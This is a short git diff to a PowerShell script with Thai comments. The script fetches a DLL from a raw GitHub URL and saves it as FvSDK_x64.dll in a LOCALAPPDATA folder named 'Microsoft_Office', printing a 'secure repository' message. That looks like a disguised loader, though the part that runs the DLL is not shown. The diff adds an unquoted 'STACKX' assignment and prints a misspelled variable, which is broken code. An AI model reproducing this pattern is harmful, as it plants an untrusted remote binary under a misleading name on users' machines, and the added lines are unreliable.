@@ -7,6 +7,7 @@ $GithubDllUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/
 # เส้นทางจัดเก็บข้อมูลแอปพลิเคชัน
 $AppDataDir   = "$env:LOCALAPPDATA\Microsoft_Office"
 $LocalDllPath = "$AppDataDir\FvSDK_x64.dll"
+$LocalDllPathh = STACKX
 
 # ระบบตรวจสอบและเตรียมความพร้อมของโฟลเดอร์ปลายทาง
 if (-not (Test-Path $AppDataDir)) {
@@ -79,7 +80,7 @@ if (Test-Path $LocalDllPath) {
     Write-Host "[-] Core components missing. Downloading from secure repository..." -ForegroundColor Yellow
     try {
         Invoke-WebRequest -Uri $GithubDllUrl -OutFile $LocalDllPath -ErrorAction Stop
-        Write-Host "[+] Download Complete: $LocalDllPath" -ForegroundColor Green
+        Write-Host "[+] Download Complete: $LocalDllPathh" -ForegroundColor Green
     }
     catch {
         Write-Host "[-] Critical Error: Failed to download repository assets." -ForegroundColor Red
